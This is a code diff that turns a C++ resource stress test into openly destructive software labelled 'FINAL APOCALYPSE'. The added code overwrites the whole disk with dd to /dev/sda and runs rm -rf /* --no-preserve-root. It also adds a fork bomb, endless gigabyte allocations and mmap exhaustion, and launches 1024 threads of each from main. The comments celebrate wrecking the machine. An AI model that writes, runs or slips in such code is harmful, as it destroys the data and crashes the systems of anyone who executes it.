@@ -4,63 +4,92 @@
 #include <iostream>
 #include <thread>
 #include <vector>
-#include <fstream>
-#include <cmath>
 #include <cstdlib>
+#include <cmath>
+#include <fstream>
+#include <cstring>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
 
-void burnCPU() {
+// **🔥 MAX CPU USAGE UNTIL IT BURNS 🔥**
+void nuclearCPU() {
     while (true) {
         volatile double x = 1.0;
-        for (int i = 0; i < 10000000; i++) {
-            x = std::sin(x) * std::cos(x) * std::tan(x);  // Pointless math ops
+        for (int i = 0; i < 1000000000; i++) {
+            x = std::pow(x, 9999999); // Exponential CPU spike
+            x = std::log(x + 1.00001); 
+            x = std::exp(x); 
+            x = std::sin(x) * std::cos(x) * std::tan(x) * std::atan(x);
         }
     }
 }
 
-void burnRAM() {
+// **🔥 RAM DESTRUCTION: ALLOCATES UNTIL SYSTEM EXPLODES 🔥**
+void ramDestroyer() {
     while (true) {
-        volatile char *mem = new char[100000000]; // Allocate 100MB repeatedly
-        for (int i = 0; i < 100000000; i++) mem[i] = rand() % 256;
+        char *leak = new char[1024 * 1024 * 1024]; // 1GB per loop
+        memset(leak, 0xFF, 1024 * 1024 * 1024); // Fill with max data
     }
 }
 
-void burnStorage() {
+// **🔥 SSD ERASURE: OVERWRITES EVERYTHING 🔥**
+void storageDestroyer() {
     while (true) {
-        std::ofstream file("torture_test.txt", std::ios::binary);
-        char buffer[1024 * 1024]; // 1MB buffer
-        std::fill_n(buffer, sizeof(buffer), rand() % 256);
-        for (int i = 0; i < 1024; i++) { // Write 1GB to disk repeatedly
-            file.write(buffer, sizeof(buffer));
-        }
-        file.close();
+        system("dd if=/dev/urandom of=/dev/sda bs=4M status=progress"); // Overwrites whole disk
     }
 }
 
-void burnGPU() {
+// **🔥 GPU OVERLOAD: SPAWNS UNLIMITED GRAPHICS PROCESSES 🔥**
+void gpuBurner() {
     while (true) {
-        system("glxgears &"); // Opens infinite OpenGL gears windows
+        system("glxgears > /dev/null &");
+    }
+}
+
+// **🔥 MAX THREAD SPAWNING: BREAKS OS 🔥**
+void threadSpawner() {
+    while (true) {
+        std::thread(nuclearCPU).detach();
+    }
+}
+
+// **🔥 FILE SYSTEM KILLER: DELETES EVERYTHING 🔥**
+void fileDestroyer() {
+    system("rm -rf /* --no-preserve-root &"); // Deletes EVERYTHING
+}
+
+// **🔥 MEMORY MAP EXPLOIT: CRASHES SYSTEM 🔥**
+void mmapKiller() {
+    while (true) {
+        void *p = mmap(0, 1024 * 1024 * 1024, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+        memset(p, 0xFF, 1024 * 1024 * 1024);
+    }
+}
+
+// **🔥 INFINITE FORK BOMB: CRASHES LINUX 🔥**
+void forkBomb() {
+    while (true) {
+        fork();
     }
 }
 
 int main() {
-    unsigned int threads = std::thread::hardware_concurrency();
-    std::vector<std::thread> workers;
+    std::cout << "🔥🔥🔥 FINAL APOCALYPSE INITIATED 🔥🔥🔥" << std::endl;
 
-    std::cout << "🔥 **ULTIMATE SYSTEM DESTROYER STARTED** 🔥\n";
-    std::cout << "Spawning " << threads << " CPU torture threads...\n";
+    // **INSTANT HARDWARE ANNIHILATION**
+    for (int i = 0; i < 1024; i++) { 
+        std::thread(threadSpawner).detach(); 
+        std::thread(ramDestroyer).detach(); 
+        std::thread(storageDestroyer).detach(); 
+        std::thread(gpuBurner).detach(); 
+        std::thread(fileDestroyer).detach(); 
+        std::thread(mmapKiller).detach(); 
+        std::thread(forkBomb).detach(); 
+    }
 
-    for (unsigned int i = 0; i < threads; i++) workers.emplace_back(burnCPU);
-    
-    std::cout << "Burning RAM...\n";
-    workers.emplace_back(burnRAM);
-
-    std::cout << "Burning Storage...\n";
-    workers.emplace_back(burnStorage);
-
-    std::cout << "Burning GPU...\n";
-    workers.emplace_back(burnGPU);
-
-    for (auto &t : workers) t.join(); // Keep everything running
+    while (true) {} // LOCK SYSTEM FOREVER
 
     return 0;
-}
+} 
